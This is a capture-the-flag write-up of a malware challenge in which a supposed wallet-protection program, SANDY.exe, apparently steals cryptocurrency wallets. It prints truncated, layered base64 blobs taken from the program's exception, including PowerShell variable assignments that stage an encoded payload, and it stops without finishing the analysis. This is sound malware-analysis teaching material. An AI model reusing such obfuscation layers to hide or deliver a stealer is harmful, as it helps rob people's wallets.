# SANDY

| Category   | Author       |
| ---------- | ------------ |
| ðŸž Malware | John Hammond |

> My friend Sandy is really into cryptocurrencies! She's been trying to get me into it too, so she showed me a lot of Chrome extensions I could add to manage my wallets. Once I got everything sent up, she gave me this cool program!
> 
> She says it adds better protection so my wallets can't get messed with by hackers.
> 
> Sandy wouldn't lie to me, would she...? Sandy is the best!
> 
> **CAUTION**
> 
> This is the Malware category, and as such, includes malware. Please be sure to analyze these files within an isolated virtual machine.
> 
> The password to the archive is `infected`.

Execute SANDY.exe in a VM and get an exception
Capture text from the exception

```
JABlAG4AYwBvAGQAZQBkAFMAYwByAGkAcAB0ACAAPQAgACIASgBBAEIAaQBBAEcARQBBAGMAdwBCAGwAQQBEAFkAQQBOAEEAQgBqAEEARwA4AEEAWgBBAEIAbABBAEcAUQBBAEkAQQBBADkAQQBDAEEAQQBJAGcAQgBoAEEARQBrAEEAVABBAEIANABBAEcAdwBBAFMA
dwBBAHgAQQBGAEEAQQBkAHcAQgBZAEEARgBnAEEAUwBBAEIAVwBBAEUANABBAE0AQQBCAHYAQQBHADgAQQBVAGcAQQA1AEEARQBZAEEATwBRAEIAawBBAEUAbwBBAE4AZwBCAG0AQQBFAHcAQQBiAEEAQQAxAEEARQBzAEEAYQB3AEIAcgBBAEYAWQBBAFcAUQBCADEA
QQBIAFEAQQBTAHcAQgBZAEEARwBrAEEAYwB3AEIAcgBBAEMAOABBAGEAZwBBADEAQQBFAEkAQQBiAEEAQgA2AEEASABjAEEAZQBRAEIAMQBBAEYAbwBBAGMAdwBCAEUAQQBFADQAQQBkAEEAQgAzAEEASABjAEEAVABRAEEANQBBAEcAbwBBAFYAdwBCAFYAQQBGAGsA
QQBhAHcAQgBWAEEASABBAEEAUwBRAEIANABBAEgAbwBBAE0AdwBCAGEAQQBGAEkAQQBZAHcAQgAzAEEARQA4AEEAZAB3AEIASABBAEUATQBBAGEAdwBCAHkAQQBFAFUAQQBPAEEAQgBsAEEARQBVAEEAYgB3AEIAbgBBAEgAZwBBAFYAQQBBAHoAQQBGAGcAQQBTAHcA
QgBIAEEASABFAEEAYQBRAEIAcgBBAEcARQBBAGUAZwBCAGkAQQBHAGMAQQBSAFEAQgBoAEEASABFAEEAVgBRAEIANQBBAEcAawBBAE0AQQBCAHEAQQBFADgAQQBUAEEAQQA1AEEARQBRAEEATQBnAEIATwBBAEYASQBBAFoAZwBBAHcAQQBHADQAQQBXAGcAQgBoAEEA
RABZAEEAUwBRAEIANgBBAEUAVQBBAFcAZwBCAGEAQQBHAFkAQQBRAHcAQgBHAEEAQwBzAEEAVwBRAEIAawBBAEUAawBBAFEAdwBCAHoAQQBGAGsAQQBhAEEAQgBKAEEARgBJAEEATgBRAEIAUABBAEcAUQBBAGQAUQBCAG4AQQBIAFEAQQBSAGcAQgBrAEEARwBJAEEA
SwB3AEIAUgBBAEUAawBBAFQAdwBCAEsAQQBFAHMAQQBhAEEAQgBYAEEASABjAEEAYQBnAEIARwBBAEUARQBBAGMAZwBCAG8AQQBFAEkAQQBOAGcAQgBpAEEARgBrAEEAVgB3AEEAMABBAEUARQBBAFYAdwBBAHIAQQBEAE0AQQBUAFEAQgBPAEEARgBJAEEAVQBRAEEA
MgBBAEQARQBBAGUAUQBCADAAQQBEAGcAQQBiAFEAQgByAEEARwB3AEEAZABRAEEAMgBBAEUAUQBBAFYAUQBCAGkAQQBEAGMAQQBTAGcAQgBsAEEARQBNAEEATgBRAEIAbwBBAEcAZwBBAFoAQQBCAEUAQQBHAHcAQQBNAHcAQgAwAEEARABNAEEAUgBBAEIAdABBAEgA
YwBBAEsAdwBBAHcAQQBFAHcAQQBhAEEAQgBFAEEARABVAEEAVQB3AEEAMgBBAEcAZwBBAEsAdwBBADQAQQBIAFkAQQBaAGcAQQAyAEEARABZAEEAWQBRAEEAeABBAEgAZwBBAFMAdwBCAEcAQQBHAHcAQQBPAEEAQgBuAEEARwB3AEEAZAB3AEIAeQBBAEgAZwBBAE8A
QQBBAHYAQQBFAFEAQQBaAEEAQQA0AEEARwA0AEEATgBBAEIASABBAEcATQBBAFYAdwBCAGsAQQBHADAAQQBZAGcAQgBuAEEARQA0AEEAWQBRAEIASgBBAEMAOABBAGMAQQBCAEwAQQBHAFUAQQBjAHcAQgAxAEEARwBZAEEATgBBAEIAaQBBAEQAQQBBAE0AZwBCAE0A
QQBIAGsAQQBXAGcAQgB6AEEASABBAEEAUwBRAEIAMgBBAEQARQBBAGQAUQBCAHYAQQBFAEUAQQBlAEEAQgAwAEEASABVAEEAVQBBAEEAegBBAEUAUQBBAFcAZwBCADEAQQBIAE0AQQBaAFEAQgBDAEEASABNAEEAWgBBAEIAMQBBAEUARQBBAE4AZwBCAFUAQQBHAEkA
QQBVAFEAQgBCAEEARQBZAEEAVQB3AEIAQgBBAEgAUQBBAFYAZwBCAGsAQQBFAE0AQQBTAHcAQgBUAEEARwA4AEEAVAB3AEIAegBBAEQASQBBAFMAUQBCAGoAQQBEAE0AQQBWAFEAQgBFAEEARQBRAEEAYQB3AEIAaABBAEUANABBAE4AQQBCAG4AQQBIAEUAQQBiAGcA
QgBLAEEARQBnAEEAVgB3AEIAcwBBAEYARQBBAFYAdwBBADAAQQBDADgAQQBXAFEAQQB3AEEARwBNAEEAVgBRAEEAeQBBAEcAUQBBAFIAdwBBADMAQQBFADQAQQBSAFEAQgBSAEEARwBFAEEAZABRAEIATgBBAEUAUQBBAFMAdwBCAFcAQQBIAGMAQQBMAHcAQgBTAEEA
SABZAEEAVQBBAEIAVABBAEQAawBBAFQAZwBCAEcAQQBFADQAQQBkAGcAQgBYAEEARQBjAEEAVQBRAEEAMwBBAEgAZwBBAGIAdwBBAHoAQQBIAEEAQQBhAEEAQgBzAEEARwBjAEEAZAB3AEIAUgBBAEgAawBBAFkAdwBCAG4AQQBFAGsAQQBLAHcAQgBsAEEARABFAEEA
WgBBAEIAcwBBAEcANABBAGQAUQBBAHoAQQBHAHMAQQBOAFEAQgBUAEEASABvAEEAVQB3AEIAbABBAEYAZwBBAGEAQQBBAHgAQQBGAGcAQQBTAEEAQgB3AEEARQBzAEEAVgBnAEEAcgBBAEgARQBBAE4AQQBCAHkAQQBGAEEAQQBkAEEAQgBGAEEARwBZAEEAVgB3AEEA
cgBBAEYATQBBAGQAZwBCAEYAQQBIAGsAQQBUAGcAQgBqAEEARQBFAEEAVgBnAEIAawBBAEUASQBBAFQAQQBCAGkAQQBIAFkAQQBTAEEAQgBRAEEARABZAEEAWgBnAEIAMgBBAEcAOABBAGMAdwBCAGEAQQBIAFUAQQBSAFEAQgB1AEEARwBRAEEAUwBRAEEAMABBAEgA
bwBBAE0AdwBCAFcAQQBGAEEAQQBWAGcAQgByAEEARgBJAEEAYwB3AEEAdgBBAEcAWQBBAGQAZwBCAFYAQQBHADQAQQBXAFEAQgBDAEEARQAwAEEAYgBnAEIARABBAEQASQBBAFoAUQBCAFcAQQBFAHMAQQBkAHcAQgBXAEEARABRAEEAUwBBAEIAWQBBAEgAVQBBAE4A
ZwBBADUAQQBIAGMAQQBLAHcAQgBuAEEASABjAEEAVABBAEEAdwBBAEgASQBBAGIAQQBCAFAAQQBGAGMAQQBVAEEAQgByAEEARABFAEEATgBnAEIAeABBAEcAOABBAEsAdwBBADQAQQBFADAAQQBOAGcAQgBCAEEARwBFAEEAVwBBAEEAegBBAEUAYwBBAFoAQQBCAGoA
QQBFAFUAQQBUAHcAQgBsAEEARQBvAEEATgBBAEIATABBAEcAWQBBAGIAUQBCAGsAQQBHAGcAQQBhAHcAQgBEAEEARwBRAEEAVABnAEIAMABBAEUAcwBBAGQAQQBCAFoAQQBGAEUAQQBiAHcAQQB5AEEARQA4AEEAYwB3AEIAbABBAEgAawBBAGQAdwBCAHcAQQBEAGMA" 
```

Base64 decode into 

```
$encodedScript = "JABiAGEAcwBlADYANABjAG8AZABlAGQAIAA9ACAAIgBhAEkATAB4AGwASwAxAFAAdwBYAFgASABWAE4AMABvAG8AUgA5AEYAOQBkAEoANgBmAEwAbAA1AEsAawBrAFYAWQB1AHQASwBYAGkAcwBrAC8AagA1AEIAbAB6AHcAeQB1AFoAcwBEAE4AdAB3AHcATQA5AGoAVwBVAFkAawBVAHAASQB4AHoAMwBaAFIAYwB3AE8AdwBHAEMAawByAEUAOABlAEUAbwBnAHgAVAAzAFgASwBHAHEAaQBrAGEAegBiAGcARQBhAHEAVQB5AGkAMABqAE8ATAA5AEQAMgBOAFIAZgAwAG4AWgBhADYASQB6AEUAWgBaAGYAQwBGACsAWQBkAEkAQwBzAFkAaABJAFIANQBPAGQAdQBnAHQARgBkAGIAKwBRAEkATwBKAEsAaABXAHcAagBGAEEAcgBoAEIANgBiAFkAVwA0AEEAVwArADMATQBOAFIAUQA2ADEAeQB0ADgAbQBrAGwAdQA2AEQAVQBiADcASgBlAEMANQBoAGgAZABEAGwAMwB0ADMARABtAHcAKwAwAEwAaABEADUAUwA2AGgAKwA4AHYAZgA2ADYAYQAxAHgASwBGAGwAOABnAGwAdwByAHgAOAAvAEQAZAA4AG4ANABHAGMAVwBkAG0AYgBnAE4AYQBJAC8AcABLAGUAcwB1AGYANABiADAAMgBMAHkAWgBzAHAASQB2ADEAdQBvAEEAeAB0AHUAUAAzAEQAWgB1AHMAZQBCAHMAZAB1AEEANgBUAGIAUQBBAEYAUwBBAHQAVgBkAEMASwBTAG8ATwBzADIASQBjADMAVQBEAEQAawBhAE4ANABnAHEAbgBKAEgAVwBsAFEAVwA0AC8AWQAwAGMAVQAyAGQARwA3AE4ARQBRAGEAdQBNAEQASwBWAHcALwBSAHYAUABTADkATgBGAE4AdgBXAEcAUQA3AHgAbwAzAHAAaABsAGcAdwBRAHkAYwBnAEkAKwBlADEAZABsAG4AdQAzAGsANQBTAHoAUwBlAFgAaAAxAFgASABwAEsAVgArAHEANAByAFAAdABFAGYAVwArAFMAdgBFAHkATgBjAEEAVgBkAEIATABiAHYASABQADYAZgB2AG8AcwBaAHUARQBuAGQASQA0AHoAMwBWAFAAVgBrAFIAcwAvAGYAdgBVAG4AWQBCAE0AbgBDADIAZQBWAEsAdwBWADQASABYAHUANgA5AHcAKwBnAHcATAAwAHIAbABPAFcAUABrADEANgBxAG8AKwA4AE0ANgBBAGEAWAAzAEcAZABjAEUATwBlAEoANABLAGYAbQBkAGgAawBDAGQATgB0AEsAdABZAFEAbwAyAE8AcwBlAHkAdwBwADc
```

Base64 decode into

```
$base64coded = "aILxlK1PwXXHVN0ooR9F9dJ6fLl5KkkVYutKXisk/j5BlzwyuZsDNtwwM9jWUYkUpIxz3ZRcwOwGCkrE8eEogxT3XKGqikazbgEaqUyi0jOL9D2NRf0nZa6IzEZZfCF+YdICsYhIR5OdugtFdb+QIOJKhWwjFArhB6bYW4AW+3MNRQ61yt8mklu6DUb7JeC5hhdDl3t3Dmw+0LhD5S6h+8vf66a1xKFl8glwrx8/Dd8n4GcWdmbgNaI/pKesuf4b02LyZspIv1uoAxtuP3DZuseBsduA6TbQAFSAtVdCKSoOs2Ic3UDDkaN4gqnJHWlQW4/Y0cU2dG7NEQauMDKVw/RvPS9NFNvWGQ7xo3phlgwQycgI+e1dlnu3k5SzSeXh1XHpKV+q4rPtEfW+SvEyNcAVdBLbvHP6fvosZuEndI4z3VPVkRs/fvUnYBMnC2eVKwV4HXu69w+gwL0rlOWPk16qo+8M6AaX3GdcEOeJ4KfmdhkCdNtKtYQo2Oseywp7
```

